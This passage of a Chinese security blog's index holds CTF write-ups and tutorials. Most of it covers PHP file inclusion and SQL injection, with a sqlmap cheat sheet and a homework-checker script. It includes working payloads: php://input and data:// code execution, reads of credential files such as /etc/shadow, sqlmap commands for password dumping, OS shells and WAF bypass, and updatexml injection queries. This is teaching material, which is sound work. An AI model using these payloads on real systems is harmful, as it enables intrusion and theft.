compressed_data += '0' * padding\n\n    with open(output_file, 'wb') as f:\n        # Write frequency information\n        f.write(bytes([len(frequencies)]))\n        for byte, freq in frequencies.items():\n            f.write(bytes([byte, (freq >> 24) & 0xFF, (freq >> 16) & 0xFF, (freq >> 8) & 0xFF, freq & 0xFF]))\n\n        # Write compressed data\n        for i in range(0, len(compressed_data), 8):\n            byte = compressed_data[i:i+8]\n            f.write(bytes([int(byte, 2)]))\n\nif __name__ == \"__main__\":\n    input_file = 'input.txt'\n    compressed_file = 'compressed.bin'\n    decompressed_file = 'decompressed.txt'\n\n    # 压缩文件\n    compress(input_file, compressed_file)\n\n    # 解压缩文件\n    decompress(compressed_file, decompressed_file)\n```\n\n2. 观察源码发现 缺少解压缩函数 编写解压缩函数\n\n```python\ndef decompress(input_file, output_file):\n    # 读取压缩文件中的数据\n    with open(input_file, 'rb') as f:\n        compressed_data = f.read()\n        # print(compressed_data)\n    # 读取频率信息\n    num_symbols = compressed_data[0]\n    # print(num_symbols)\n    frequencies = {}\n    index = 1\n    for _ in range(num_symbols):\n        symbol = compressed_data[index]\n        # print(symbol)\n        freq = (compressed_data[index + 1] << 24) | (compressed_data[index + 2] << 16) | (compressed_data[index + 3] << 8) | compressed_data[index + 4]\n        frequencies[symbol] = freq\n        index += 5\n\n    # 重建 Huffman 树\n    root = build_huffman_tree(frequencies)\n\n    # 解压缩数据\n    current_node = root\n    decompressed_data = []\n    for byte in compressed_data[index:]:\n        byte_value = int(byte)\n        for i in range(7, -1, -1):\n            bit = (byte_value >> i) & 1\n            if bit == 0:\n                current_node = current_node.left\n            else:\n                current_node = current_node.right\n\n            if current_node.char is not None:\n                decompressed_data.append(current_node.char)\n                current_node = root\n\n    # 将解压缩后的数据写入文件\n    with open(output_file, 'wb') as f:\n        f.write(bytes(decompressed_data))\n```\n\n3. 运行代码得到`decompressed.txt`\n\n![image-20230811231022544](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230811231022544.png)\n\n\n\n## codes\n\n![image-20230814145755134](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230814145755134.png)\n\n1. 进入访问页面后：\n\n<img src=\"https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230814145936294.png\" alt=\"image-20230814145936294\" style=\"zoom:67%;\" />\n\n2. 观察得到 需要输入C语言代码，输入system后没有正常显示，猜测可能是被过滤了\n\n3. 于是通过`argv` 直接打印命令行参数\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\nint main(int argc, char **argv) {\n    // 打印命令行参数\n    printf(\"Command line arguments:\\n\");\n    for (int i = 0; i < 20; i++) {\n        printf(\"argv[%d]: %s\\n\", i, argv[i]);\n    }\n\n    return 0;\n}\n```\n\n![image-20230814150202144](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230814150202144.png)\n","tags":["ctf","misc"],"categories":["CTF","NepCTF 2023"]},{"title":"文件包含","url":"/文件包含/","content":"\n# 文件包含\n\n## 含义\n\n本质是输入一段用户能够控制的脚本或者代码，并让服务端执行。\n\n1. 以PHP为例，常用的文件包含\n\n`include(),require(),include_once(),require_once()`\n\n2. 区别\n\n- *require():*找不到被包含的文件会产生致命警告，并停止脚本运行\n- *include():*找不到被包含的文件只会产生警告，脚本继续运行\n- *require_once()与require()类似:*唯一的区别就是如果该文件的代码已经被包含，则不会执行\n- *include_once()与include()类似:*唯一的区别就是如果该文件的代码已经被包含，则不会执行\n\n3. 分析\n\n一个简单的例子，我们利用`phpstudy`,在网站根目录创建两个文件：\n\n首先是`include.php`\n\n```php\n<?php\n\tinclude $_GET['test'];\n?>\n```\n\n接着是`phpinfo.php`\n\n```php\n<?php\n\tphpinfo();\n?>\n```\n\n成功解析\n\n<img src=\"https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808143942662.png\" alt=\"image-20230808143942662\" style=\"zoom:80%;\" />\n\n将phpinfo.php文件后缀改为txt后进行访问，依然可以解析:\n\n<img src=\"https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808144634126.png\" alt=\"image-20230808144634126\" style=\"zoom:80%;\" />\n\n将phpinfo.php文件后缀改为jpg格式，也可以解析:\n\n<img src=\"https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808144725186.png\" alt=\"image-20230808144725186\" style=\"zoom:80%;\" />\n\n可以看出，include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来。\n\n上传了一jpg格式的一句话木马，如果网站有文件包含漏洞，jpg文件就可以被当做php文件解析，所以这就是文件上传漏洞通常配合文件上传使用。\n\n## 本地文件包含漏洞(LFI)\n\n能够打开并包含本地文件的漏洞，我们称为本地文件包含漏洞(LFI)\n\n<img src=\"https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808145244893.png\" alt=\"image-20230808145244893\" style=\"zoom:80%;\" />\n\n同时也可以利用该代码，读取一些本地系统的敏感信息\n\n例如：`C:\\Windows\\system.ini`\n\n1. 使用绝地路径直接读取:\n\n`localhost/include.php?filename=C:\\Windows\\system.ini`\n\n2. 使用相对路径进行读取:\n\n​\t`./` 表示当前路径\n\n​\t`../` 表示上一级路径位置\n\n例如当前页面所在路径为`C:\\Apache24\\htdocs\\`，我们需要使用../退到C盘再进行访问，构造路径如下：\n`../../windows/system.ini`\n\n3. 常见的敏感目录信息路径:\n\nWindows系统:\n\n- C:\\boot.ini //查看系统版本\n- C:\\windows\\system32\\inetsrv\\MetaBase.xml //IIS配置文件\n- C:\\windows\\repair\\sam //存储Windows系统初次安装的密码\n- C:\\ProgramFiles\\mysql\\my.ini //Mysql配置\n- C:\\ProgramFiles\\mysql\\data\\mysql\\user.MYD //MySQL root密码\n- C:\\windows\\php.ini //php配置信息\n\nLinux/Unix系统:\n\n- /etc/password //账户信息\n- /etc/shadow //账户密码信息\n- /usr/local/app/apache2/conf/httpd.conf //Apache2默认配置文件\n- /usr/local/app/apache2/conf/extra/httpd-vhost.conf //虚拟网站配置\n- /usr/local/app/php5/lib/php.ini //PHP相关配置\n- /etc/httpd/conf/httpd.conf //Apache配置文件\n- /etc/my.conf //mysql配置文件\n\n### LFI漏洞利用技巧\n\n1. 配合文件上传使用\n\n有时候我们找不到文件上传漏洞，无法上传webshell，可以先上传一个图片格式的webshell到服务器，再利用本地文件包含漏洞进行解析。\n\n例题：`DVWA File Upload`\n\n源码：\n\n```php\n<?php\n\nif( isset( $_POST[ 'Upload' ] ) ) {\n    // Where are we going to be writing to?\n    $target_path  = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\";\n    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );\n\n    // Can we move the file to the upload folder?\n    if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) {\n        // No\n        echo '<pre>Your image was not uploaded.</pre>';\n    }\n    else {\n        // Yes!\n        echo \"<pre>{$target_path} succesfully uploaded!</pre>\";\n    }\n}\n\n?>\n```\n\n简单介绍一下解题思路：\n\n可以看到，服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。\n\n上传一句话木马，并通过蚁剑进行连接爆破目录：\n\n![image-20230808154439463](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808154439463.png)\n\n2. 包含Apache日志文件\n\n**利用条件:**\n\n- 对日志文件可读\n- 知道日志文件存储目录\n\n**注意:**\n\n- 一般情况下日志存储目录会被修改，需要读取服务器配置文件(httpd.conf,nginx,conf,......)或者根据phpinfo()中的信息来得知\n- 日志记录的信息都可以被调整，比如记录报错的等级，或者内容格式\n\n在用户发起请求时，服务器会将请求写入access.log，当发生错误时将错误写入error.log，日志文件如下:\n\n![image-20230808153750802](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808153750802.png)\n\n正常访问网页时，access日志会进行记录，如下图记录所示：\n\n![image-20230808153929107](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808153929107.png)\n\n### 包含session文件\n\n可以先根据尝试包含到SESSION文件，在根据文件内容寻找可控变量，在构造payload插入到文件中，最后包含即可。\n\n**利用条件:**\n\n- 找到Session内的可控变量\n- Session文件可读写，并且知道存储路径\n\nphp的session文件的保存路径可以在phpinfo的session.save_path看到。\n\n![image-20230808155049759](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808155049759.png)\n\n**session常见存储路径:**\n\n- /var/lib/php/sess_PHPSESSID\n- /var/lib/php/sess_PHPSESSID\n- /tmp/sess_PHPSESSID\n- /tmp/sessions/sess_PHPSESSID\n- session文件格式:sess_[phpsessid],而phpsessid在发送的请求的cookie字段中可以看到。\n\n### 包含临时文件\n\n![在这里插入图片描述](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/e6618d373f0c467cb1a7fc6cb4b0046b.png)\nphp中上传文件，会创建临时文件。在linux下使用/tmp目录，而在windows下使用C:\\windows\\temp目录。在临时文件被删除前，可以利用时间竞争的方式包含该临时文件。\n\n由于包含需要知道包含的文件名。一种方法是进行暴力猜解，linux下使用的是随机函数有缺陷，而windows下只有65535种不同的文件名，所以这个方法是可行的。\n\n另一种方法是配合phpinfo页面的php variables，可以直接获取到上传文件的存储路径和临时文件名，直接包含即可。\n\n## 远程文件包含(RFI)\n\n如果PHP的配置选项`allow_url_include`、`allow_url_fopen`状态为ON的话，则**include/require**函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)\n\n![image-20230808155617492](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230808155617492.png)\n\n首先我们来看一段代码`include.php`\n\n```php\n<?php\n\t$path=$_GET['path'];\n\tinclude($path . '/phpinfo.php');\n?>\n```\n\n`127.0.0.1/include.php/path=site`访问本地site目录下的phpinfo.php文件:\n\n该页面并没有对$path做任何过滤，因此存在文件包含漏洞。\n\n我们在远端Web服务器/site/目录下创建一个test.php文件，内容为phpinfo()，利用漏洞去读取这个文件。\n\n但是代码会给我们输入的路径后面加上’/phpinfo.php’后缀，如果php版本小于5.3.4，我们可以尝试使用%00截断，这里php版本为7.3.4，不适用。\n\n还有一种截断方法就是?号截断，在路径后面输入?号，服务器会认为?号后面的内容为GET方法传递的参数，成功读取test.php如下：\n![在这里插入图片描述](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/5f410573f9664f12bff64166719a0592.png)\n\n如果test.php是恶意的webshell文件，那么利用该漏洞就可以获取到服务器权限。\n\n## PHP伪协议\n\nPHP内置了很多URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数\n\n如下所示\n![在这里插入图片描述](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/30b963c25bea48dcbc496cffb05d9989.png)\n\n### 1.file://协议\n\n**file://** 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响\n![在这里插入图片描述](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/b36518ada13d4840adda715be02c8c57.png)\nfile:// [文件的绝对路径和文件名]\n![在这里插入图片描述](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/c7155542f0104f3588a3b809f5e30dbc.png)\n\n### 2.php://协议\n\nphp:// 访问各个输入/输出流（I/O streams），在CTF中经常使用的是`php://filter`和`php://input`\n**php://filter用于读取源码**。\n**php://input用于执行php代码**。\n\n**php://filter** 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。\n**利用条件:**\n\n- allow_url_fopen ：off/on\n- allow_url_include：off/on\n\n例如有一些敏感信息会保存在php文件中，如果我们直接利用文件包含去打开一个php文件，php代码是不会显示在页面上的，例如打开当前目录下的2.php:\n![在这里插入图片描述](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/82059d24101a403b9f3b8e7769e4cf9f.png)\n他只显示了一条语句，这时候我们可以以base64编码的方式读取指定文件的源码:\n\n输入\n`php://filter/convert.base64-encode/resource=文件路径`\n得到2.php加密后的源码：\n![在这里插入图片描述](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/b667bf338aab4e82bcf72ad77472b3f0.png)\n再进行base64解码，获取到2.php的完整源码信息：\n![在这里插入图片描述](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/65f354f2a2774be9b74c3f3940b8e0b3.png)\n**php://input** 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。当传入的参数作为文件名打开时，可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。\n**利用条件:**\n\n- allow_url_fopen ：off/on\n- allow_url_include：on\n\n利用该方法，我们可以直接写入php文件，输入`file=php://input`，然后使用burp抓包，写入php代码：\n![在这里插入图片描述](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/b8cdd2c6e9a94365b64c58ef3f5c48ee.png)\n发送报文，可以看到本地生成了一句话木马：\n![在这里插入图片描述](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/c99b110b71cc4854a2cfc3821b6befe3.png)\n\n### 3.ZIP://协议\n\n**zip://** 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。\n\n- zip://中只能传入绝对路径。\n- 要用#分割压缩包和压缩包里的内容，并且#要用url编码成%23(即下述POC中#要用%23替换）\n- 只需要是zip的压缩包即可，后缀名可以任意更改。\n- 相同的类型还有zlib://和bzip2://\n\n**利用条件:**\n\n- allow_url_fopen ：off/on\n- allow_url_include：off/on\n\nPOC为：\n\n```java\nzip://[压缩包绝对路径]#[压缩包内文件]?file=zip://D:\\1.zip%23phpinfo.txt\n```\n\n![在这里插入图片描述](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/7f04b0e59fda44cdb669d99fa315410b.png)\n\n### 4.data://协议\n\n**data://** 同样类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。\n\n利用data:// 伪协议可以直接达到执行php代码的效果，例如执行phpinfo()函数：\n**利用条件:**\n\n- allow_url_fopen ：on\n- allow_url_include：on\n\nPOC为:\n\n```java\ndata://text/plain,<?php phpinfo();?>\n//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：\ndata://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=\n```\n\n![在这里插入图片描述](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/fdf0d4eb7b9f4b40b4e22b6990162cb8.png)\n\n### 5.伪协议利用条件\n\n伪协议的利用方法还有很多，这里就不一一举例了。\n伪协议的用法小结\n![在这里插入图片描述](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/4737e3fbbbae4ebda4d419264e9e556c.png)\n\n## 文件包含漏洞防护\n\n1、使用**str_replace**等方法过滤掉危险字符\n\n2、配置open_basedir，防止目录遍历（**open_basedir 将php所能打开的文件限制在指定的目录树中**）\n\n3、php版本升级，防止%00截断\n\n4、对上传的文件进行重命名，防止被读取\n\n5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。\n\n6、做好管理员权限划分，做好文件的权限管理，**allow_url_include和allow_url_fopen**最小权限化\n"},{"title":"Python Homework Checker","url":"/Python-Homework-Checker/","content":"\n# Python Homework Checker(根据Excel名单对照文件夹中学生作业进行检查是否提交作业) \n\n​          现在一般的作业都是网上提交文件为主，我们总会有一些作为收作业的人会烦恼谁还没交作业，所以我就这个问题写了一段小代码来检测哪个人没交作业。 \n\n​           原理是读入作业所在的文件夹里面所有的文件名称，将这些文件名称和你要收集的名单对比，将没有的名单输出 以下是一个用Python检查学生是否提交作业的程序，它可以检查一个文件夹中是否存在按学生学号命名的PDF文件，以确定哪些学生已经提交作业。本程序使用`openpyxl`和`os`库，因此需要确保安装了这两个库。 \n\n​          如果Excel文件中有多列信息，我们可以使用列标题来查找学号所在的列。我们还需要根据学号来提取姓名，因为文件夹中的PDF文件名是“学号-姓名”格式。 \n\n​          这个程序首先查找Excel文件中包含“学号”标题的列，并记录该列的列字母。然后它遍历文件夹中的PDF文件，对于每个PDF文件，它会提取学生学号和姓名，并将学号和姓名添加到已提交字典中。然后它遍历Excel文件中的每一行，使用学号列的列字母来提取学生学号，并使用学号在已提交字典中查找对应的姓名，并打印出相应的提交状态。 \n\n## 代码复现\n\n```python\n\nimport openpyxl\nimport os\n\n# 定义文件夹路径和Excel文件路径\nfolder_path = \"D:\\\\University\\\\Sophomore_second\\\\R222A1035120001工程项目管理与经济决策\\\\R222A1035120001工程项目管理与经济决策\"\nexcel_path = \"D:\\\\University\\\\Sophomore_second\\\\R222A1035120001工程项目管理与经济决策\\\\R222A1035120001学生名单0310.xlsx\"\n\n# 打开Excel文件\nwb = openpyxl.load_workbook(excel_path)\nsheet = wb.active\n\n# 创建一个空的字典来存储已经提交作业的学生学号\nsubmitted = {}\n\n# 查找Excel文件中学号所在的列\nheaders = [cell.value for cell in sheet[1]]\nif \"学号\" not in headers:\n    print(\"Error: cannot find the column containing student IDs.\")\n    exit()\n\nstudent_id_column = headers.index(\"学号\") + 1\n\n# 遍历文件夹中的PDF文件，检查是否存在按学生学号命名的PDF文件\nfor filename in os.listdir(folder_path):\n    if filename.endswith(\".pdf\"):\n        student_id, student_name = filename[:-4].rsplit(\"-\", 1) # 分离学号和姓名\n        submitted[student_id] = student_name\n\n# 遍历Excel文件中的学生名单，检查哪些学生已经提交作业\nfor row in sheet.iter_rows(min_row=2, values_only=True):\n    student_id = str(row[student_id_column - 1])\n    if student_id in submitted:\n        pass\n    else:\n        print(f\"{row[1]} ({student_id}) has not submitted the homework.\")\n\n\n```\n","tags":["python","excel","openpyxl","os"],"categories":["python"]},{"title":"sqlmap 常用指令","url":"/sqlmap-常用指令/","content":"\n# sqlmap 常用指令\n\nSQLMap 是一款自动化的SQL注入测试工具，在 kali 上已集成\n\n```bash\n基本操作笔记：-u  #注入点 \n-f  #指纹判别数据库类型 \n-b  #获取数据库版本信息 \n-p  #指定可测试的参数(?page=1&id=2 -p \"page,id\") \n-D \"\"  #指定数据库名 \n-T \"\"  #指定表名 \n-C \"\"  #指定字段 \n-s \"\"  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s \"xx.log\"　　恢复:-s \"xx.log\" --resume) \n--level=(1-5) #要执行的测试水平等级，默认为1 \n\t--level1：默认的等级，会进行基本的测试，包括GET和POST方式。\n\t--level2: 在原有的基础上增加对cookie的检测。 \n\t--level3: 增加对User Agent、Referer 的检测 \n\t--lever4: 更多的payload \n\t--level5: 最高等级，包含所有的payload,会尝试自动破解出cookie、xff等头部注入。\n\t\n--risk=(0-3)  #测试执行的风险等级，默认为1 \n--time-sec=(2,5) #延迟响应，默认为5 \n--data #通过POST发送数据 \n--columns        #列出字段 \n--current-user   #获取当前用户名称 \n--current-db     #获取当前数据库名称 \n--users          #列数据库所有用户 \n--passwords      #数据库用户所有密码 \n--privileges     #查看用户权限(--privileges -U root) \n-U               #指定数据库用户 \n--dbs            #列出所有数据库 \n--tables -D \"\"   #列出指定数据库中的表 \n--columns -T \"user\" -D \"mysql\"      #列出mysql数据库中的user表的所有字段 \n--dump-all            #列出所有数据库所有表 \n--exclude-sysdbs      #只列出用户自己新建的数据库和表 \n--dump -T \"\" -D \"\" -C \"\"   #列出指定数据库的表的字段的数据(--dump -T users -D master -C surname) \n--dump -T \"\" -D \"\" --start 2 --top 4  # 列出指定数据库的表的2-4字段的数据 \n--dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) \n--os      #指定系统(Linux,Windows) \n-v  #详细的等级(0-6) \n    0：只显示Python的回溯，错误和关键消息。 \n    1：显示信息和警告消息。 \n    2：显示调试消息。 \n    3：有效载荷注入。 \n    4：显示HTTP请求。 \n    5：显示HTTP响应头。 \n    6：显示HTTP响应页面的内容 \n--privileges  #查看权限 \n--is-dba      #是否是数据库管理员 \n--roles       #枚举数据库用户角色 \n--udf-inject  #导入用户自定义函数（获取系统权限） \n--union-check  #是否支持union 注入 \n--union-cols #union 查询表记录 \n--union-test #union 语句测试 \n--union-use  #采用union 注入 \n--union-tech orderby #union配合order by \n--data \"\" #POST方式提交数据(--data \"page=1&id=2\") \n--cookie \"用;号分开\"      #cookie注入(--cookies=\"PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low\") \n--referer \"\"     #使用referer欺骗(--referer \"http://www.baidu.com\") \n--user-agent \"\"  #自定义user-agent \n--proxy \"http://127.0.0.1:8118\" #代理注入 \n--string=\"\"    #指定关键词,字符串匹配. \n--threads 　　  #采用多线程(--threads 3) \n--sql-shell    #执行指定sql命令 \n--sql-query    #执行指定的sql语句(--sql-query \"SELECT password FROM mysql.user WHERE user = 'root' LIMIT 0, 1\" ) \n--file-read    #读取指定文件 \n--file-write   #写入本地文件(--file-write /test/test.txt --file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) \n--file-dest    #要写入的文件绝对路径 \n--os-cmd=id    #执行系统命令 \n--os-shell     #系统交互shell \n--os-pwn       #反弹shell(--os-pwn --msf-path=/opt/framework/msf3/) \n--msf-path=    #matesploit绝对路径(--msf-path=/opt/framework/msf3/) \n--os-smbrelay  # \n--os-bof       # \n--reg-read     #读取win系统注册表 \n--priv-esc     # \n--time-sec=    #延迟设置 默认--time-sec=5 为5秒 \n-p \"user-agent\" --user-agent \"sqlmap/0.7rc1 (http://sqlmap.sourceforge.net)\"  #指定user-agent注入 \n--eta          #盲注 \n/pentest/database/sqlmap/txt/\ncommon-columns.txt　　字段字典　　　 \ncommon-outputs.txt \ncommon-tables.txt      表字典 \nkeywords.txt \noracle-default-passwords.txt \nuser-agents.txt \nwordlist.txt \n\n常用语句 :\n1./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db --users --passwords --dbs -v 0 \n2./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --passwords -U root --union-use -v 2 \n3./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -T users -C username -D userdb --start 2 --stop 3 -v 2 \n4./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --dump -C \"user,pass\"  -v 1 --exclude-sysdbs \n5./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --sql-shell -v 2 \n6./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-read \"c:\\boot.ini\" -v 2 \n7./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --file-write /test/test.txt --file-dest /var/www/html/1.txt -v 2 \n8./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-cmd \"id\" -v 1 \n9./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-shell --union-use -v 2 \n10./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 --priv-esc -v 1 \n11./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-pwn --msf-path=/opt/framework/msf3 -v 1 \n12./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --os-bof --msf-path=/opt/framework/msf3 -v 1 \n13./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 --reg-add --reg-key=\"HKEY_LOCAL_NACHINE\\SOFEWARE\\sqlmap\" --reg-value=Test --reg-type=REG_SZ --reg-data=1 \n14./sqlmap.py -u http://www.xxxxx.com/test.php?p=2 -b --eta \n15./sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1\" -p id --prefix \"')\" --suffix \"AND ('abc'='abc\"\n16./sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1\" --auth-type Basic --auth-cred \"testuser:testpass\"\n17./sqlmap.py -l burp.log --scope=\"(www)?\\.target\\.(com|net|org)\"\n18./sqlmap.py -u \"http://192.168.136.131/sqlmap/mysql/get_int.php?id=1\" --tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 \n19./sqlmap.py -u \"http://192.168.136.131/sqlmap/mssql/get_int.php?id=1\" --sql-query \"SELECT 'foo'\" -v 1 \n20./sqlmap.py -u \"http://192.168.136.129/mysql/get_int_4.php?id=1\" --common-tables -D testdb --banner \n21./sqlmap.py -u \"http://192.168.136.129/mysql/get_int_4.php?id=1\" --cookie=\"PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low\" --string='xx' --dbs --level=3 -p \"uid\"\n\n简单的注入流程 :\n1.读取数据库版本，当前用户，当前数据库 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 -f -b --current-user --current-db -v 1 \n2.判断当前数据库用户权限 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --privileges -U 用户名 -v 1 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --is-dba -U 用户名 -v 1 \n3.读取所有数据库用户或指定数据库用户的密码 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --users --passwords -v 2 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --passwords -U root -v 2 \n4.获取所有数据库 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --dbs -v 2 \n5.获取指定数据库中的所有表 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --tables -D mysql -v 2 \n6.获取指定数据库名中指定表的字段 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --columns -D mysql -T users -v 2 \n7.获取指定数据库名中指定表中指定字段的数据 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --dump -D mysql -T users -C \"username,password\" -s \"sqlnmapdb.log\" -v 2 \n8.file-read读取web文件 \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --file-read \"/etc/passwd\" -v 2 \n9.file-write写入文件到web \nsqlmap -u http://www.xxxxx.com/test.php?p=2 --file-write /localhost/mm.php --file使用sqlmap绕过防火墙进行注入测试\n```\n\n# sqlmap 常用绕过脚本\n\n使用方法 `--tamper xxx.py`\n\n```bash\napostrophemask.py                         用UTF-8全角字符替换单引号字符\n\napostrophenullencode.py                   用非法双字节unicode字符替换单引号字符\n\nappendnullbyte.py                         在payload末尾添加空字符编码\n\nbase64encode.py                           对给定的payload全部字符使用Base64编码\n\nbetween.py                                分别用“NOT BETWEEN 0 AND \n#”替换大于号“>”，“BETWEEN # AND #”替换等于号“=”\n\nbluecoat.py              在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”\n\nchardoubleencode.py      对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）\n\ncharencode.py            对给定的payload全部字符使用URL编码（不处理已经编码的字符）\n\ncharunicodeencode.py     对给定的payload的非编码字符使用Unicode 编码（不处理已经编码的字符）\n\nconcat2concatws.py  用“CONCAT_WS(MID(CHAR(0), 0, 0), A,B)”替换像“CONCAT(A, B)”的实例\n\nequaltolike.py          用“LIKE”运算符替换全部等于号“=”\n\ngreatest.py             用“GREATEST”函数替换大于号“>”\n\nhalfversionedmorekeywords.py         在每个关键字之前添加MySQL注释\n\nifnull2ifisnull.py                   用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例\n\nlowercase.py                         用小写值替换每个关键字字符\n\nmodsecurityversioned.py              用注释包围完整的查询\n\nmodsecurityzeroversioned.py          用当中带有数字零的注释包围完整的查询\n\nmultiplespaces.py                    在SQL关键字周围添加多个空格\n\nnonrecursivereplacement.py           用representations替换预定义SQL关键字，适用于过滤器\n\noverlongutf8.py                      转换给定的payload当中的所有字符\n\npercentage.py                        在每个字符之前添加一个百分号\n\nrandomcase.py                        随机转换每个关键字字符的大小写\n\nrandomcomments.py                    向SQL关键字中插入随机注释\n\nsecuresphere.py                      添加经过特殊构造的字符串\n\nsp_password.py向payload末尾添加“sp_password” for automatic obfuscation from DBMS logs\n\nspace2comment.py                     用“//”替换空格符**\n\nspace2dash.py                     用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符\n\nspace2hash.py                     用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符\n\nspace2morehash.py                 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符\n\nspace2mssqlblank.py               用一组有效的备选字符集当中的随机空白符替换空格符\n\nspace2mssqlhash.py                用磅注释符“#”其次是一个换行符替换空格符\n\nspace2mysqlblank.py               用一组有效的备选字符集当中的随机空白符替换空格符\n\nspace2mysqldash.py                用破折号注释符“–”其次是一个换行符替换空格符\n\nspace2plus.py                     用加号“+”替换空格符\n\nspace2randomblank.py              用一组有效的备选字符集当中的随机空白符替换空格符\n\nunionalltounion.py                用“UNION SELECT”替换“UNION ALL SELECT”\n\nunmagicquotes.py                  用一个多字节组合%bf%27和末尾通用注释一起替换空格符\n\nvarnish.py                        添加一个HTTP头“X-originating-IP”来绕过WAF\n\nversionedkeywords.py              用MySQL注释包围每个非函数关键字\n\nversionedmorekeywords.py          用MySQL注释包围每个关键字\n\nxforwardedfor.py                  添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF\n```\n\n","tags":["sql注入","sqlmap"],"categories":["Web"]},{"title":"例题(手工注入)","url":"/例题-手工注入/","content":"\n# 例题(手工注入)\n\n### 例题1：报错注入(ctfhub)\n\n![image-20230714202120498](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202120498-1691289107543-2.png)\n\n报错注入：首先想到 ``updatexml`` \n\n```sql\n1 union select updatexml(1,concat(0x7e,(select database()),0x7e),1)\n```\n\n![image-20230714202501659](https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230714202501659-1691289107544-4.png)\n\n此时查询到数据库名：sqli\n\n```sql\n1 union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where 